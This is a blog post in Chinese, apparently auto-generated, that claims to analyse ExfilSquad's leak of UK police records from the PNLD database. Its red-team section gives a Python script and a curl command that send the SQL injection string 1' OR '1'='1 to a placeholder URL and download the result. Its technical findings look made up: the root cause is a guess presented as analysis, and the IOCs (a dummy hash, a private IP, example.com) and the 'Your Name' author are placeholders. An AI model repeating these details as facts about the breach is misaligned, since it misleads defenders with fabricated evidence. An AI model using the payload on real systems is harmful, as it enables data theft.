---
layout: post
title:  "ExfilSquad hackers leak info of over 100,000 UK police officers, staff"
date:   2026-08-03 19:24:20 +0000
categories: [security]
severity: high
---

# 🔥 解析 ExfilSquad 對英國警察國家法律數據庫的攻擊
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 7.5)
> * **受駭指標**: Info Leak
> * **關鍵技術**: Data Exfiltration, Ransomware, Social Engineering

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: ExfilSquad 利用了 PNLD 的安全漏洞，可能是通過 SQL Injection 或 Cross-Site Scripting (XSS) 攻擊，獲得了未經授權的存取權限。
* **攻擊流程圖解**: 
    1. 攻擊者發送惡意請求到 PNLD 伺服器。
    2. 伺服器未能正確驗證請求，導致攻擊者獲得了存取權限。
    3. 攻擊者下載了 1.9 GB 的數據，包括 135,000 條記錄。
* **受影響元件**: PNLD 的網站和數據庫，包括 Ask the Police 平台。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有基本的網路知識和工具，例如 `curl` 和 `nmap`。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 定義惡意請求的 URL 和參數
    url = "https://example.com/pnld"
    params = {"id": "1' OR '1'='1"}
    
    # 發送惡意請求
    response = requests.get(url, params=params)
    
    # 下載數據
    if response.status_code == 200:
        data = response.content
        # 將數據保存到文件
        with open("data.txt", "wb") as f:
            f.write(data)
    
    ```
    *範例指令*: 使用 `curl` 下載數據：`curl -X GET 'https://example.com/pnld?id=1%27%20OR%20%271%27%3D%271' -o data.txt`
* **繞過技術**: ExfilSquad 可能使用了社交工程術來欺騙使用者下載惡意軟件或點擊惡意連結。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /pnld/data.txt |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule ExfilSquad {
        meta:
            description = "ExfilSquad 攻擊偵測"
            author = "Your Name"
        strings:
            $a = "SELECT * FROM users WHERE id = 1' OR '1'='1"
        condition:
            $a
    }
    
    ```
    或者是使用 Snort/Suricata Signature：

```

snort
alert tcp any any -> any any (msg:"ExfilSquad 攻擊"; content:"SELECT * FROM users WHERE id = 1' OR '1'='1"; sid:1000001;)

```
* **緩解措施**: 更新 PNLD 的安全補丁，強化密碼和驗證機制，限制存取權限。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Data Exfiltration (數據外泄)**: 想像數據像水一樣從容器中流出。技術上是指未經授權的存取和下載敏感數據。
* **Ransomware (勒索軟件)**: 想像攻擊者把數據鎖起來，要求贖金。技術上是指一種惡意軟件，攻擊者使用加密算法鎖起來數據，要求受害者支付贖金。
* **Social Engineering (社交工程)**: 想像攻擊者使用心理操縱來欺騙使用者。技術上是指攻擊者使用各種手段，例如電子郵件、電話、短信等，來欺騙使用者下載惡意軟件或點擊惡意連結。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/exfilsquad-hackers-leak-info-of-over-100-000-uk-police-officers-staff/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


